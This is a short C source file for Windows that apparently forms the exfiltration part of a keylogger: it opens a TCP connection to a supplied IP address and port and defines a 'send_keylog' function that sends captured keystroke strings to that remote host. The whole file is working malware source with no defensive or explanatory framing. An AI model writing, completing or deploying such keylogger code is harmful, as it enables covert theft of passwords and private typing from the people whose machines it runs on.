#include<stdio.h>
#include<windows.h>
#include"send_keylog.h"


SOCKET create_conn(char* ip, int port){
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    if(WSAStartup(MAKEWORD(2,2), &wsa)!=0){
        printf("Failed to initialize Winsock. Error Code : %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET){
        printf("Failed to get Socket. ERROR code: %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    int result = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    return sock; 
}

void send_keylog(SOCKET sock, char* key){
    if(send(sock, key, strlen(key),0 )< 0){
        printf("Failed to get Socket. ERROR code: %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }
}

void close_socket(SOCKET sock){
    closesocket(sock);
    WSACleanup();
}